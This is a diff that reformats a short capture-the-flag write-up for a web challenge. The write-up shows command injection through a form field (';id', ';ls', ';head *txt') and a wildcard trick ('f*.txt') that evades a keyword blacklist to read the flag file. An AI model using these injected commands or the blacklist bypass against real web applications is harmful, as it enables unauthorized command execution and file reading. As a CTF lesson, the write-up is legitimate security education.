@@ -1,62 +1,46 @@
 # AsciiArt - CTF Writeup
 # Web(Med)
 
-The challenge was a Web challenge where the description said that the website would "answer your command". I suspected that the input might be executed as a system command, so I started by testing it.
+# AsciiArt — Web (Medium)
 
-First, I entered:
+The challenge page said it would “answer your command,” so I tested whether it was running shell commands behind the scenes.
 
+I entered:
+
+```text
 ;id
+```
 
-The output was:
+The page returned:
 
+```text
 uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+```
 
-This confirmed that I had command injection.
+That showed me my input was being run as a command. I listed the current directory next:
 
-I then listed the files in the current directory:
-
+```text
 ;ls
+```
 
-This showed:
+I saw a file called `dontopnme.txt`, so I checked it:
 
-Dockerfile
-app.py
-dontopnme.txt
-requirements.txt
-static
-templates
-
-I noticed dontopnme.txt, so I tried reading the text files using head:
-
+```text
 ;head *txt
+```
 
-It gave me the clue:
+It gave me a hint: the flag wasn’t in that file; it was somewhere inside the `static` directory. I listed that directory and its subdirectories:
 
-"Yall never listen, the flag is not here, dont be greedy.
-tho the flag is inside a directory within the static directory."
-
-So I recursively listed the static directory:
-
+```text
 ;ls -R static
+```
 
-This showed the path:
+The listing showed `static/proud/of/you/flag.txt`. The page blocked the word `flag` when I typed it directly, so I used `f*.txt` instead:
 
-static/proud/of/you/flag.txt
-
-I tried accessing the file normally, but the application had a blacklist that blocked the words cat, flag, and tac.
-
-Instead of directly writing flag.txt, I used a shell wildcard:
-
+```text
 ;head static/proud/of/you/f*.txt
+```
 
-The  * matches the remaining characters, so the shell expands f*.txt to flag.txt gi. This bypassed the blacklist and displayed the flag.
+The `*` is a shell wildcard. It matched the rest of the filename, so the shell opened `flag.txt` and printed its contents.
 
-Commands used:
-
-;id
-;ls
-;head *txt
-;ls -R static
-;head static/proud/of/you/f*.txt
-
-flag-bi0s{y0u_4r3_4l0t_m0r3_cr34t1v3_th4n_1_3xp3ct3d}
+**Flag:** `flag-bi0s{y0u_4r3_4l0t_m0r3_cr34t1v3_th4n_1_3xp3ct3d}`
